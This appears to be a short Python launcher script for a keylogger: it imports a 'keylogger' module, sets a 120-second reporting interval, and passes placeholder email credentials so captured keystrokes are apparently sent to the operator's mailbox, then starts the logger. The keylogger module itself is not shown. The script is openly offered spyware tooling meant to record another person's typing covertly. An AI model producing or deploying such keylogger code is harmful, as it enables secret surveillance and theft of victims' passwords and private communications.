#!usr/bin/env python

import keylogger

my_keylogger = keylogger.Keylogger(120, "email_address", "password")    #Enter the email address and password of your email_account 
my_keylogger.start()
